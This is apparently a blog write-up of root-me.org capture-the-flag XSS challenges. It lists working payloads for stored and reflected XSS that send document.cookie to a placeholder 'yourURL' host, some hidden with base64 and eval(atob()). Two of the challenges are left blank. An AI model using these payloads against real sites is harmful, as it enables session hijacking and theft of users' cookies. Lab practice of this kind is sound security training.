---
title: "[root-me.org] XSS CHALLENGE"
date: 2018-12-04T09:30:14+07:00
draft: false
slug: ROOTME-XSS
tags : [XSS,rootme,writeup]
---
---
# LIST OF CHALLGENGE
|ID| Challgenge  | Done  |
|------------| ------------ | ------------ |
|**1**|[**XSS - Stored 1**](#1)  |  ✅ |
|**2**|[**XSS - Stored 2**](#2) | ✅  |
|**3**|[**XSS - Reflected**](#3)|✅ |
|**4**|[**XSS - Stored - filter bypass**](#4)|❌|
|**5**|[**XSS - DOM Based**](#5)|❌|
---
<a name="1"></a>
# XSS - Stored 1
- **Link :** [http://challenge01.root-me.org/web-client/ch18/](http://challenge01.root-me.org/web-client/ch18/)
- **Vulnerablity :** Input Message
- **Payload :** `<img src=0 onerror=document.location='yourURL/'+document.cookie>`
- **Note :** Wait a minutessssss....

---
<a name="2"></a>
# XSS - Stored 2
- **Link :** [http://challenge01.root-me.org/web-client/ch19/](http://challenge01.root-me.org/web-client/ch19/)
- **Vulnerablity :**🍪 Cookie
- **yourBase64code :** `document.write("<img src='yourURL?c="+ document.cookie +"' />")`
- **Payload :** `<script>eval(atob('yourBase64code'))</script>`
- **Note :** Some charaters were sanitized

---
<a name="3"></a>
# XSS - Reflected
- **Link :** [http://challenge01.root-me.org/web-client/ch26/](http://challenge01.root-me.org/web-client/ch26/)
- **Vulnerablity :** `http://challenge01.root-me.org/web-client/ch26/?p=[payload]`
- **Thinking :** hmmm, a tags --> HTML Event Attributes 
- **base64code:**`(new Image()).src="yourURL/?se=".concat(document.cookie)`
- **Because in chall fillter `+,<,>,...` ,so using eval(atob(base64Code)):**
```
' onmouseover='eval(atob("base64code"))
```

---
<a name="4"></a>
# XSS - Stored - filter bypass
- **Link :** [http://challenge01.root-me.org/web-client/ch21/](http://challenge01.root-me.org/web-client/ch21/)
- **Vulnerablity :**
- **Payload :**
- **Note :**

---
<a name="5"></a>
# XSS - DOM Based
- **Link :**[http://challenge01.root-me.org/web-client/ch24/](http://challenge01.root-me.org/web-client/ch24/)
- **Vulnerablity :**
- **Payload :**
- **Note :**
